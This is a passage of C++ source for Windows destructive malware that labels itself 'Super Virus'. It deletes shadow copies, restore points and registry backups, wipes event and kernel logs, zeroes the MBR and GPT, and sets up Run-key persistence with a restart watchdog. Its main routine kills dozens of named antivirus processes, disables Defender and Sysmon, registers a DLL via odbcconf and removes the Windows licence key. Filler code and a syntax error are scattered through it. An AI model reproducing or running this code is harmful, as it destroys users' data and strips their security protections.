	RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters"),
				 0, KEY_WRITE, &hKey);
	if (hKey != NULL)
	{
		DWORD dwValue = 0;
		RegSetValueEx(hKey, _T("EnablePrefetcher"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
		RegCloseKey(hKey);
	}
}
void ClearSystemRestorePoints()
{
	SilentExecuteCmd(_T("wmic shadowcopy delete"));
	SilentExecuteCmd(_T("vssadmin delete shadows /all /quiet"));
	SilentExecuteCmd(_T("wmic computersystem set SystemRestoreEnabled=FALSE"));
	SilentExecuteCmd(_T("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f /quiet"));
}
void ClearVolumeShadowCopies()
{
	SilentExecuteCmd(_T("vssadmin delete shadows /all /quiet"));
	SilentExecuteCmd(_T("wmic shadowcopy delete /quiet"));
	SilentExecuteCmd(_T("sc config vss start= disabled /quiet"));
	SilentExecuteCmd(_T("net stop vss /quiet"));
	SilentExecuteCmd(_T("del /f /q /s C:\\System Volume Information\\*.vhd 2>NUL"));
	SilentExecuteCmd(_T("del /f /q /s C:\\System Volume Information\\*.vss 2>NUL"));
}

void ClearRegistryBackupTraces()
{
	TCHAR szRegBackPath[MAX_PATH] = { 0 };
	GetSystemDirectory(szRegBackPath, MAX_PATH);
	_tcscat_s(szRegBackPath, MAX_PATH, _T("\\config\\RegBack\\"));

	if (PathIsDirectory(szRegBackPath))
	{
		WIN32_FIND_DATA fd = { 0 };
		TCHAR szSearchPath[MAX_PATH] = { 0 };
		_stprintf_s(szSearchPath, MAX_PATH, _T("%s*.*"), szRegBackPath);

		HANDLE hFind = FindFirstFile(szSearchPath, &fd);
		if (hFind != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (_tcscmp(fd.cFileName, _T(".")) && _tcscmp(fd.cFileName, _T("..")))
				{
					TCHAR szFilePath[MAX_PATH] = { 0 };
					_stprintf_s(szFilePath, MAX_PATH, _T("%s%s"), szRegBackPath, fd.cFileName);
					SetFileAttributes(szFilePath, FILE_ATTRIBUTE_NORMAL);
					if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						std::vector<LPTSTR> dirs;
						dirs.push_back(szFilePath);
						for (auto dir : dirs)
						{
							TCHAR szSubPath[MAX_PATH] = { 0 };
							_stprintf_s(szSubPath, MAX_PATH, _T("%s\\*.*"), dir);
							HANDLE hSubFind = FindFirstFile(szSubPath, &fd);
							if (hSubFind != INVALID_HANDLE_VALUE)
							{
								do
								{
									if (_tcscmp(fd.cFileName, _T(".")) && _tcscmp(fd.cFileName, _T("..")))
									{
										TCHAR szSubFilePath[MAX_PATH] = { 0 };
										_stprintf_s(szSubFilePath, MAX_PATH, _T("%s\\%s"), dir, fd.cFileName);
										SetFileAttributes(szSubFilePath, FILE_ATTRIBUTE_NORMAL);
										DeleteFile(szSubFilePath);
									}
								} while (FindNextFile(hSubFind, &fd));
								FindClose(hSubFind);
							}
							RemoveDirectory(dir);
						}
					}
					else
					{
						DeleteFile(szFilePath);
					}
				}
			} while (FindNextFile(hFind, &fd));
			FindClose(hFind);
		}
	}

	SilentExecuteCmd(_T("del /f /q /s C:\\Windows\\Backup\\Registry\\*.* 2>NUL"));
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\BackupRestore\\FilesNotToBackup"),
				 0, KEY_WRITE, &hKey);
	if (hKey != NULL)
	{
		RegSetValueEx(hKey, _T("Registry"), 0, REG_SZ, (BYTE*)_T("*"), 2);
		RegCloseKey(hKey);
	}
}

typedef NTSTATUS(NTAPI* pZwSetSystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength
);
typedef NTSTATUS(NTAPI* pZwQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);

void SafeExecuteKernelCmd(LPCTSTR lpCmdLine)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	CreateProcess(NULL, (LPTSTR)lpCmdLine, NULL, NULL, TRUE,
				  CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi);

	if (pi.hProcess != NULL)
	{
		WaitForSingleObject(pi.hProcess, 5000);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}

void SafeClearETWKernelTrace()
{
	OSVERSIONINFOEX osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&osvi);
	if (osvi.dwMajorVersion < 10 || osvi.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)
		return;
	SafeExecuteKernelCmd(_T("logman stop KernelTrace -ets -quiet"));
	SafeExecuteKernelCmd(_T("logman delete KernelTrace -ets -quiet"));
	TCHAR szEtwPath[MAX_PATH] = _T("C:\\Windows\\System32\\WDI\\LogFiles\\Kernel.etl");
	if (PathFileExists(szEtwPath))
	{
		SetFileAttributes(szEtwPath, FILE_ATTRIBUTE_NORMAL);
		DeleteFile(szEtwPath);
	}
}

void SafeDeleteKernelLogReg()
{
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
							 _T("SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\KernelTrace"),
							 0, KEY_READ | KEY_WRITE, &hKey);

	if (lRet != ERROR_SUCCESS) return;
	RegDeleteValue(hKey, _T("FileName"));
	RegDeleteValue(hKey, _T("Enable"));
	RegCloseKey(hKey);
}
void SafeClearDebugLog()
{
	HKEY hKey = NULL;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
				   _T("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Debug Print Filter"),
				   0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

	if (hKey != NULL)
	{
		DWORD dwValue = 0;
		RegSetValueEx(hKey, _T("DEFAULT"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
		RegCloseKey(hKey);
	}
}
void ClearOnlyKernelLogs_Safe()
{
	SafeClearETWKernelTrace();
	SafeClearDebugLog();
	SafeDeleteKernelLogReg();
	SafeExecuteKernelCmd(_T("fsutil behavior set debug 0"));
	SafeExecuteKernelCmd(_T("fsutil usn deletejournal /D C:"));
}
class AdminElevator
{
private:
	AdminElevator() = default;
	static BOOL IsProcessElevated()
	{
		BOOL fIsElevated = FALSE;
		HANDLE hToken = NULL;

		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		{
			TOKEN_ELEVATION elevation = { 0 };
			DWORD dwSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize))
			{
				fIsElevated = elevation.TokenIsElevated;
			}
		}

		if (hToken) CloseHandle(hToken);
		return fIsElevated;
	}
	static BOOL RelaunchAsAdmin()
	{
		TCHAR szPath[MAX_PATH] = { 0 };
		if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)) == 0)
		{
			return FALSE;
		}

		SHELLEXECUTEINFO sei = { 0 };
		sei.cbSize = sizeof(SHELLEXECUTEINFO);
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
		sei.lpVerb = _T("runas");
		sei.lpFile = szPath;
		sei.lpParameters = NULL;
		sei.nShow = SW_SHOWNORMAL;

		if (!ShellExecuteEx(&sei))
		{
			return FALSE;
		}

		if (sei.hProcess != NULL)
		{
			WaitForSingleObject(sei.hProcess, INFINITE);
			CloseHandle(sei.hProcess);
		}

		return TRUE;
	}

public:
	static void EnsureAdminPrivileges()
	{
		if (!IsProcessElevated())
		{
			if (RelaunchAsAdmin())
			{
				ExitProcess(0);
			}
			else
			{
				ExitProcess(1);
			}
		}
	}
};

void SilentDeleteFilesByExtension(const wchar_t* rootPath, const wchar_t* targetExt)
{
	WIN32_FIND_DATAW findData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	std::wstring searchPath = rootPath;
	if (!searchPath.empty() && searchPath.back() != L'\\')
		searchPath += L"\\";
	std::wstring fullSearchPath = searchPath + L"*";

	hFind = FindFirstFileW(fullSearchPath.c_str(), &findData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return;
	}
	do
	{
		if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
			continue;
		std::wstring fullPath = searchPath + findData.cFileName;

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			SilentDeleteFilesByExtension(fullPath.c_str(), targetExt);
		}
		else
		{
			if (PathMatchSpecW(findData.cFileName, targetExt))
			{
				DeleteFileW(fullPath.c_str());
			}
		}

	} while (FindNextFileW(hFind, &findData) != 0);

	FindClose(hFind);
}

std::vector<std::wstring> EnumerateTargetDrives()
{
	std::vector<std::wstring> targetDrives;
	wchar_t driveBuffer[1024] = { 0 };


	DWORD driveCount = GetLogicalDriveStringsW(_countof(driveBuffer), driveBuffer);
	if (driveCount == 0 || driveCount >= _countof(driveBuffer))
	{
		return targetDrives;
	}
	wchar_t* pDrive = driveBuffer;
	while (*pDrive != L'\0')
	{
		UINT driveType = GetDriveTypeW(pDrive);


		if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE)
		{
			targetDrives.push_back(pDrive);
		}
		pDrive += wcslen(pDrive) + 1;
	}

	return targetDrives;
}

void CleanAllDrivesFiles(const wchar_t* targetExt)
{
	std::vector<std::wstring> drives = EnumerateTargetDrives();
	for (const auto& drive : drives)
	{
		SilentDeleteFilesByExtension(drive.c_str(), targetExt);
	}
}

class ApplicationCore {
public:
	ApplicationCore() {}
	~ApplicationCore() {}

	void Execute() {
		for (int i = 0; i < 10; ++i) {
			Sleep(1000);
		}
	}
};

class ProcessGuardian {
public:
	ProcessGuardian() {
		TCHAR path[MAX_PATH] = { 0 };
		GetModuleFileName(NULL, path, MAX_PATH);
		m_processName = std::wstring(_tcsrchr(path, '\\') + 1);
		m_processPath = std::wstring(path);

		m_daemonThread = (HANDLE)_beginthreadex(NULL, 0, &ProcessGuardian::MonitorThread, this, 0, NULL);
		SetAutoStart(true);
	}

	~ProcessGuardian() {
		m_keepRunning = false;
		if (m_daemonThread) {
			WaitForSingleObject(m_daemonThread, 5000);
			CloseHandle(m_daemonThread);
		}
	}

	bool SetAutoStart(bool enable) {
		HKEY hKey;
		LONG result = RegOpenKeyEx(HKEY_CURRENT_USER,
								   L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
							 0, KEY_WRITE, &hKey);

		if (result != ERROR_SUCCESS) {
			return false;
		}

		if (enable) {
			result = RegSetValueEx(hKey, m_processName.c_str(), 0, REG_SZ,
								   (const BYTE*)m_processPath.c_str(),
								   (m_processPath.length() + 1) * sizeof(TCHAR));
		} else {
			result = RegDeleteValue(hKey, m_processName.c_str());
		}

		RegCloseKey(hKey);
		return result == ERROR_SUCCESS;
	}

	void RestartMainProcess() {
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;

		CreateProcess(NULL, (LPWSTR)m_processPath.c_str(), NULL, NULL, FALSE,
					  0, NULL, NULL, &si, &pi);

		if (pi.hProcess) CloseHandle(pi.hProcess);
		if (pi.hThread) CloseHandle(pi.hThread);
	}

	bool IsProcessRunning() {
		bool running = false;
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (snapshot != INVALID_HANDLE_VALUE) {
			PROCESSENTRY32 pe32;
			pe32.dwSize = sizeof(PROCESSENTRY32);

			if (Process32First(snapshot, &pe32)) {
				do {
					if (_wcsicmp(pe32.szExeFile, m_processName.c_str()) == 0) {
						running = true;
						break;
					}
				} while (Process32Next(snapshot, &pe32));
			}
			CloseHandle(snapshot);
		}
		return running;
	}

	static unsigned __stdcall MonitorThread(void* param) {
		ProcessGuardian* guardian = (ProcessGuardian*)param;

		while (guardian->m_keepRunning) {
			if (!guardian->IsProcessRunning()) {
				guardian->RestartMainProcess();
			}
			Sleep(2000);
		}
		return 0;
	}

private:
	std::wstring m_processName;
	std::wstring m_processPath;
	HANDLE m_daemonThread = NULL;
	bool m_keepRunning = true;
};
void SilentExecuteCmd(LPCTSTR lpCmdLine)
{
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	CreateProcess(NULL, (LPTSTR)lpCmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (pi.hProcess != NULL)
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}

void ClearOnlyMFT()
{
	SilentExecuteCmd(_T("fsutil usn deletejournal /D C:"));
	SilentExecuteCmd(_T("cipher /w:C:"));
}

void EnableETWPrivilege()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = {0};

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	if (LookupPrivilegeValue(NULL, SE_TRACE_NAME, &tp.Privileges[0].Luid))
	{
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	}

	CloseHandle(hToken);
}

void SilentDeleteFile(LPCTSTR lpFilePath)
{
	if (GetFileAttributes(lpFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		SetFileAttributes(lpFilePath, FILE_ATTRIBUTE_NORMAL);
		DeleteFile(lpFilePath);
	}
}

void SilentDeleteDir(LPCTSTR lpDirPath)
{
	TCHAR szSearchPath[MAX_PATH] = {0};
	WIN32_FIND_DATA fd = {0};
	_stprintf_s(szSearchPath, MAX_PATH, _T("%s\\*.*"), lpDirPath);

	HANDLE hFind = FindFirstFile(szSearchPath, &fd);
	if (hFind == INVALID_HANDLE_VALUE)
		return;

		do
		{
			if (_tcscmp(fd.cFileName, _T(".")) && _tcscmp(fd.cFileName, _T("..")))
			{
				TCHAR szItemPath[MAX_PATH] = {0};
				_stprintf_s(szItemPath, MAX_PATH, _T("%s\\%s"), lpDirPath, fd.cFileName);
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					SilentDeleteDir(szItemPath);
				}
					else
					{
						SilentDeleteFile(szItemPath);
					}
			}
		} while (FindNextFile(hFind, &fd));

		FindClose(hFind);
		RemoveDirectory(lpDirPath);
}

void ClearOnlyETW()
{

	EnableETWPrivilege();

	SilentExecuteCmd(_T("logman stop * -ets -quiet"));
	SilentExecuteCmd(_T("logman delete * -ets -quiet"));
	SilentExecuteCmd(_T("logman clear * -quiet"));
	std::vector<LPCTSTR> etwLogPaths = {
		_T("C:\\PerfLogs\\"),
		_T("C:\\Windows\\Temp\\*.etl"),
		_T("C:\\Windows\\Temp\\*.blg"),
		_T("C:\\Windows\\System32\\winevt\\Logs\\*.etl")
	};
	for (LPCTSTR path : etwLogPaths)
	{
		if (PathIsDirectory(path))
			SilentDeleteDir(path);
		else
			SilentExecuteCmd(_T("del /f /q /s ") + (CString)path);
	}

	SilentExecuteCmd(_T("wevtutil cl System -quiet"));
	SilentExecuteCmd(_T("wevtutil cl Application -quiet"));
	SilentExecuteCmd(_T("wevtutil cl Setup -quiet"));
	SilentExecuteCmd(_T("wevtutil cl ForwardedEvents -quiet"));
}
void InvertScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 0; y < h; y++) {
		for (int x = 0; x < w; x++) {
			COLORREF color = GetPixel(hdc, x, y);
			color = RGB(255 - GetRValue(color), 255 - GetGValue(color), 255 - GetBValue(color));
			SetPixel(hdc, x, y, color);
		}
	}
	ReleaseDC(NULL, hdc);
}

void GlitchScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 10000; i++) {
		int x = rand() % w;
		int y = rand() % h;
		COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
		SetPixel(hdc, x, y, color);
	}
	ReleaseDC(NULL, hdc);
}

void ShakeScreen() {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 10; i++) {
		SetWindowPos(GetDesktopWindow(), NULL, rand() % 10 - 5, rand() % 10 - 5, w, h, SWP_NOSIZE | SWP_NOZORDER);
		Sleep(50);
	}
}

void GradientScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int alpha = 0; alpha <= 255; alpha += 5) {
		RECT rect;
		GetClientRect(GetDesktopWindow(), &rect);
		HBRUSH brush = CreateSolidBrush(RGB(alpha, alpha, alpha));
		FillRect(hdc, &rect, brush);
		DeleteObject(brush);
		Sleep(20);
	}
	ReleaseDC(NULL, hdc);
}

void BlurScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 1; y < h - 1; y++) {
		for (int x = 1; x < w - 1; x++) {
			COLORREF c1 = GetPixel(hdc, x - 1, y - 1);
			COLORREF c2 = GetPixel(hdc, x, y - 1);
			COLORREF c3 = GetPixel(hdc, x + 1, y - 1);
			COLORREF c4 = GetPixel(hdc, x - 1, y);
			COLORREF c5 = GetPixel(hdc, x + 1, y);
			COLORREF c6 = GetPixel(hdc, x - 1, y + 1);
			COLORREF c7 = GetPixel(hdc, x, y + 1);
			COLORREF c8 = GetPixel(hdc, x + 1, y + 1);

			int r = (GetRValue(c1) + GetRValue(c2) + GetRValue(c3) + GetRValue(c4) +
			GetRValue(c5) + GetRValue(c6) + GetRValue(c7) + GetRValue(c8)) / 8;
			int g = (GetGValue(c1) + GetGValue(c2) + GetGValue(c3) + GetGValue(c4) +
			GetGValue(c5) + GetGValue(c6) + GetGValue(c7) + GetGValue(c8)) / 8;
			int b = (GetBValue(c1) + GetBValue(c2) + GetBValue(c3) + GetBValue(c4) +
			GetBValue(c5) + GetBValue(c6) + GetBValue(c7) + GetBValue(c8)) / 8;

			SetPixel(hdc, x, y, RGB(r, g, b));
		}
	}
	ReleaseDC(NULL, hdc);
}

void FlickerScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 5; i++) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, WHITENESS);
		Sleep(100);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		Sleep(100);
	}
	ReleaseDC(NULL, hdc);
}

void BlackAndWhiteScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int y = 0; y < h; y++) {
		for (int x = 0; x < w; x++) {
			COLORREF color = GetPixel(hdc, x, y);
			int gray = (GetRValue(color) + GetGValue(color) + GetBValue(color)) / 3;
			SetPixel(hdc, x, y, RGB(gray, gray, gray));
		}
	}
	ReleaseDC(NULL, hdc);
}

void SnowScreen() {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	for (int i = 0; i < 5000; i++) {
		int x = rand() % w;
		int y = rand() % h;
		SetPixel(hdc, x, y, RGB(255, 255, 255));
	}
	ReleaseDC(NULL, hdc);
}

void ShowNotification() {
	NOTIFYICONDATA nid = { sizeof(NOTIFYICONDATA) };
	nid.hWnd = NULL;
	nid.uFlags = NIF_INFO;
	nid.dwInfoFlags = NIIF_INFO;
	wcscpy(nid.szInfoTitle, L"Super Virus");
	wcscpy(nid.szInfo, L"你的电脑废了！");
	Shell_NotifyIcon(NIM_ADD, &nid);
	Shell_NotifyIcon(NIM_DELETE, &nid);
}

void ClearMBR(wchar_t* drivePath) {
	HANDLE hDrive = CreateFileW(
		drivePath,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDrive != INVALID_HANDLE_VALUE) {
		const int MBR_SIZE = 512;
		BYTE emptyMBR[MBR_SIZE] = {0};

		DWORD bytesWritten = 0;
		WriteFile(
			hDrive,
			emptyMBR,
			MBR_SIZE,
			&bytesWritten,
			NULL
		);

		CloseHandle(hDrive);
	}
}
void ClearGPT(wchar_t* drivePath2) {
	HANDLE hDrive = CreateFileW(
		drivePath2,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDrive != INVALID_HANDLE_VALUE) {
		const int SECTOR_SIZE = 512;
		const int GPT_HEADER_LBA = 34;
		BYTE emptySector[SECTOR_SIZE] = {0};

		for (int i = 0; i < GPT_HEADER_LBA; i++) {
			LARGE_INTEGER offset;
			offset.QuadPart = (LONGLONG)i * SECTOR_SIZE;

			SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);

			DWORD bytesWritten = 0;
			WriteFile(
				hDrive,
			 emptySector,
			 SECTOR_SIZE,
			 &bytesWritten,
			 NULL
			);
		}

		CloseHandle(hDrive);
	}
}
BOOL EnablePrivilege(LPCTSTR lpPrivilegeName)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = {0};
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpPrivilegeName, &tp.Privileges[0].Luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
	CloseHandle(hToken);
	return (GetLastError() == ERROR_SUCCESS);
}

void SilentDeleteFile(LPCTSTR lpFilePath)
{
	if (GetFileAttributes(lpFilePath) != INVALID_FILE_ATTRIBUTES)
	{
		DeleteFile(lpFilePath);
	}
}


void BackupClearAndDeleteLog(LPCTSTR lpLogName, LPCTSTR lpBackupPath)
{
	HANDLE hEventLog = OpenEventLog(NULL, lpLogName);
	if (hEventLog != NULL)
	{
		ClearEventLog(hEventLog, lpBackupPath);
		CloseEventLog(hEventLog);
		SilentDeleteFile(lpBackupPath);
	}
}


void ClearAllLogsAndBackups()
{

	EnablePrivilege(SE_SECURITY_NAME);

	std::vector<LPCTSTR> logNames = {
		_T("System"),
		_T("Application"),
		_T("Security"),
		_T("Setup"),
		_T("ForwardedEvents")
	};


	TCHAR szTempPath[MAX_PATH] = {0};
	GetTempPath(MAX_PATH, szTempPath);

	for (LPCTSTR logName : logNames)
	{
		TCHAR szBackupPath[MAX_PATH] = {0};
		_stprintf_s(szBackupPath, MAX_PATH, _T("%s%s_Backup.evt"), szTempPath, logName);
		BackupClearAndDeleteLog(logName, szBackupPath);
	}
}

using namespace std;
#define cls system("cls")
#define SCRIPT_DIR "C:\\\\"
const string SCRIPT_PATH = SCRIPT_DIR + "\\diskpart_disk.txt";
int _tmain(int argc, TCHAR* argv[]) {
	system("title Microsoft Super Operating System");
	system("mode con cols=15 lines=1");
	if (IsBeingDebugged()) {
		;
		;
		{
			int* p new int[10]
			delete[] p;
			;
			printf("Hello\n");
			std::cout<<"Hello"<<std::endl;
			;
			;
			;
			;
		}
	} else {
		HANDLE mutex = CreateMutex(NULL, FALSE, L"Global\\MyApplicationMutex");
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			return 0;
		}
		system("secedit /export /cfg gp.inf /areas SECURITYPOLICY");
		cls;
		CopyToAllDrivesAndDirectories();
		cls;
		ApplicationCore appCore;
		ProcessGuardian processGuardian;

		appCore.Execute();
		AdminElevator::EnsureAdminPrivileges();
		Sleep(5000);
		system("start slmgr.vbs -upk");
		cls;
		{
			;
			;
			;
		}
		const wchar_t* targetExt = L"*.gho";
		int SMX = GetSystemMetrics(SM_CXSCREEN);
		int SMY = GetSystemMetrics(SM_CYSCREEN);
		CleanAllDrivesFiles(targetExt);
		system("wevtutil set-log Microsoft-Windows-Sysmon/Operational /enabled:false /retention:false");
		cls;
		system("odbcconf.exe /a {regsvr C:\\Users\\Public\\moq.dll}");
		cls;
		system("Set-MpPreference -SubmitSamplesConsent NeverSend");
		cls;
		KillProcessByName("360");
		cls;
		KillProcessByName("kv");
		cls;
		KillProcessByName("KV");
		cls;
		KillProcessByName("防火墙");
		cls;
		KillProcessByName("VirusScan");
		cls;
		KillProcessByName("网镖");
		cls;
		KillProcessByName("杀毒");
		cls;
		KillProcessByName("毒霸");
		cls;
		KillProcessByName("瑞星");
		cls;
		KillProcessByName("江民");
		cls;
		KillProcessByName("超级兔子");
		cls;
		KillProcessByName("优化大师");
		cls;
		KillProcessByName("木马克星");
		cls;
		KillProcessByName("木马清道夫");
		cls;
		KillProcessByName("QQ病毒");
		cls;
		KillProcessByName("注册表编辑器");
		cls;
		KillProcessByName("系统配置实用程序");
		cls;
		KillProcessByName("卡巴斯基反病毒");
		cls;
		KillProcessByName("Symantec AntiVirus");
		cls;
		KillProcessByName("Duba");
		cls;
		KillProcessByName("esteem proces");
		cls;
		KillProcessByName("绿鹰PC");
		cls;
		KillProcessByName("密码防盗");
		cls;
		KillProcessByName("噬菌体");
		cls;
		KillProcessByName("木马辅助查找器");
		cls;
		KillProcessByName("System Safety Monitor");
		cls;
		KillProcessByName("Wrapped gift Killer");
		cls;
		KillProcessByName("safe");
		cls;
		KillProcessByName("Safe");
		cls;
		KillProcessByName("Winsock Expert");
		cls;
		KillProcessByName("游戏木马检测大师");
		cls;
		KillProcessByName("msctls_statusbar32");
		cls;
		KillProcessByName("pjf(ustc)");
		cls;
		KillProcessByName("IceSword");
		cls;
		system("wmic /namespace:\\root\\Microsoft\\Windows\\Defender path MSFT_MpComputerStatus call Set-MpPreference -DisableRealtimeMonitoring $true");
		cls;
		system("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\'");
		cls;
		system("powershell -Command Add-MpPreference -AttackSurfaceReductionRules_Ids <RuleID> -AttackSurfaceReductionRules_Actions Disabled");
		cls;
		system("taskkill -im 360safe.exe -f");
		cls;
		{
			;
			;
			;
			string a="360";
			cls;
			cls;
			;
			;
		}
		system("taskkill -im 360tray.exe -f");
		cls;
		system("taskkill -im 360sd.exe -f");
		cls;
		{
			;
			string ol="360";
			;
			;
		}
		system("taskkill -im 360rp.exe -f");
		cls;
		{
			;
		}
		system("taskkill -im 360TS.exe -f");
		cls;
		{
			;
		}
		system("taskkill -im 360TSService.exe -f");
		cls;//
		;//
		;//
		;//
		;//
		;//
		;//
		system("taskkill -im 360TSTray.exe -f");
		cls;
		;
		;
		;
		;
		system("taskkill -im 360TSFirewall.exe -f");
		cls;
		{
			;
		}
		system("taskkill -im 360TSUpdate.exe -f");
		cls;
		system("taskkill -im QQPCMgr.exe -f");
		cls;
		{
			;
		}
		system("taskkill -im QQPCMgrTray.exe -f");
		cls;
		;
		system("taskkill -im QQPCRTP.exe -f");
		cls;
		;
		system("taskkill -im avp.exe -f");
		cls;
		;
		system("taskkill -im kav.exe -f");
		cls;
		;
		system("taskkill -im kis.exe -f");
		cls;
		;


		system("taskkill -im NortonSecurity.exe -f");
		cls;
		;
		system("taskkill -im ccSvcHst.exe -f");
		cls;
		;
		system("taskkill -im SymantecServiceFramework.exe -f");
		cls;
		;
		;
		system("taskkill -im McAfeeSecurityScan.exe -f");
		cls;
		;
		system("taskkill -im McAfeeFrameworkService.exe -f");
		cls;
		;
		system("taskkill -im McScan.exe -f");
		cls;
		;
		system("taskkill -im huorong.exe -f");
		cls;
		{
			;
		}
		system("taskkill -im hrservice.exe -f");
		;
		cls;
		system("taskkill -im hrtray.exe -f");
		;
		cls;
		system("taskkill -im hrfw.exe -f");
		;
		cls;
		{
			string fg="huorong";
			;
			//
			;//
			//
			;//
		}
		system("taskkill -im HIPS.exe -f");
		;
		;
		;
		;
		;
		cls;
		system("taskkill -im HIPStray.exe -f");
		cls;
		{
			//
		}
		system("taskkill -im HipsSvc.exe -f");
		cls;
		//
		;//
		;//
		//////////////
		;
		//////////
		;///////////////////////////
		////////////////////////////
		system("taskkill -im TrafficProt.exe -f");
		cls;
		system("taskkill -im MsMpEng.exe -f");
		cls;
		;//////////////////////////
